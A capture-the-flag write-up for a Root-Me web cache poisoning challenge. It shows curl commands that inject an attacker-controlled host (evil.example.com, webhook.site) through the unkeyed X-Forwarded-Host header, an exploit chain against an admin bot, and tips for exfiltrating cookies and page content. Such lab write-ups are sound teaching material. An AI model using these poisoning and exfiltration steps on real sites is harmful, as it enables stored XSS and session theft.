# Web Cache Poisoning — Unkeyed HTTP Header

**Platform**: Root-Me Pro · **Category**: Web · **Difficulty**: Easy · **Points**: 250

> Given the large number of people using your username personalization application, the system
> administrator recently implemented a cache system to reduce the load. When you mentioned he
> should be careful how he implements it, he replied that it's just a cache and there's nothing
> to worry about.

**Status: vulnerability proven end-to-end; flag not yet captured** (see "Remaining step").

---

## Recon

Flask app (`Werkzeug/3.1.3 Python/3.11.14`) behind a cache that advertises itself clearly:

```
x-cache: hit | miss
cache-control: public, max-age=86400
```

Two routes:

| Route | Function |
|---|---|
| `/` | username personalization — `GET /?username=X` |
| `/report` | `POST path=...` → an admin bot (HeadlessChrome/124) visits the submitted path |

Submitting a username renders a results block:

```html
<h3>Waouuuw CANARY!!!</h3>
<canvas id="my-canvas"></canvas>
<script src="/static/js/index.min.js"></script>
<script src="//instance-<id>.challenges.root-me.pro/static/js/confettis_manager.js"></script>
```

That second `<script>` is the interesting one: an **absolute, protocol-relative URL whose host is
built from a request header** rather than being hardcoded.

## Finding the injection

The username itself is HTML-escaped (`<b>` → `&lt;b&gt;`), so it's not the sink. The script host is:

```bash
curl -s "$U/?username=probe" -H "X-Forwarded-Host: evil.example.com" | grep confettis
# <script src="//evil.example.com/static/js/confettis_manager.js"></script>
```

Several header names work (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `Forwarded`, …);
an invented header (`X-Totally-Bogus`) does not, confirming a specific allow-list is consulted.

The value is HTML-escaped too, so there is **no attribute breakout** —
`x"></script><script>alert(1)</script>` comes back as `&#34;&gt;&lt;/script&gt;…`.
You control the script's *origin* only. That is the intended bug.

## The vulnerability

The cache key is **path + query string only**. `X-Forwarded-Host` influences the response body but
is **not part of the cache key** — it is *unkeyed*. So a response generated from an attacker's
header gets stored and replayed to everyone else:

```bash
# 1. attacker poisons
curl -i "$U/?username=pwn" -H "X-Forwarded-Host: webhook.site/<uuid>"
#    x-cache: miss   ... src="//webhook.site/<uuid>/static/js/confettis_manager.js"

# 2. victim, sending NO header at all
curl -i "$U/?username=pwn"
#    x-cache: hit    ... src="//webhook.site/<uuid>/static/js/confettis_manager.js"   <-- poisoned
```

That second response is the whole finding: a user who never sent the header is served the
attacker's script origin. Because a `<script src>` executes in the **including page's origin**,
the attacker's JS runs as `instance-<id>.challenges.root-me.pro` — full XSS, with access to the
admin's cookies and DOM.

## Exploit chain

1. Host a payload at the attacker origin. `webhook.site` answers *every* path, so it also serves
   `/static/js/confettis_manager.js`. It **must** be returned as `application/javascript` —
   `nosniff` is in play, so a `text/html` body will not execute.
2. Poison the cache entry for `/?username=<uniq>` with `X-Forwarded-Host: <attacker host>`.
3. Verify the poisoned copy is served *without* the header (`x-cache: hit`).
4. `POST /report` with that path.
5. The admin bot loads the cached, poisoned page and pulls the attacker's script.

Step 5 is confirmed: the collector logged
`GET /static/js/confettis_manager.js` from
`Mozilla/5.0 (X11; Linux x86_64) … HeadlessChrome/124.0.0.0 Safari/537.36`.

`solve.py` in this folder automates 1–5 and polls for the callback:

```bash
python3 solve.py https://instance-<id>.challenges.root-me.pro
```

## Remaining step

The bot demonstrably fetches and would execute the payload; what is outstanding is reading the
result back. Payload notes:

- An async `new Image()` beacon was **cancelled** when the headless bot tore the page down —
  use a **synchronous `XMLHttpRequest`**, which blocks until the request is on the wire, or a
  top-level `location = ...` navigation, which is the most reliable exfil of all.
- The payload now fires a `/hello` beacon as its first statement to distinguish
  "JS never executed" from "JS executed but exfil failed" — see the diagnosis matrix in `notes.md`.
- Exfil both `document.cookie` *and* the admin's rendered `/`: the nav tab is labelled
  **"Congrats"**, so the flag plausibly renders on `/` for the admin rather than sitting in a
  (likely `HttpOnly`) cookie.

## Flag

`RM{...}` — not yet captured.

## Lessons

- **A cache key that omits a header the response depends on turns a reflection into stored XSS.**
  The bug is not the reflection; it is the mismatch between what varies the response and what
  varies the cache key. The fix is either to stop trusting `X-Forwarded-Host` for URL generation
  (use a fixed host / relative path) or to add `Vary: X-Forwarded-Host`.
- Output encoding is not enough on its own. The header *was* HTML-escaped — escaping stopped the
  attribute breakout but not the origin swap, because the attacker only needed to control the host
  portion of a `<script src>`.
- Probe unkeyed headers by poisoning with the header, then re-requesting **without** it. `x-cache:
  hit` plus your injected value is the proof; anything less is just a reflection.
- Cache-busting per test (`?username=<random>`) keeps probes from colliding — and confirms the
  query string *is* keyed.
- Headless bots kill the page fast. Prefer sync XHR / navigation over async beacons for exfil.
- Root-Me Pro instances expire (~45 min) — poison, report, and collect in one automated run.
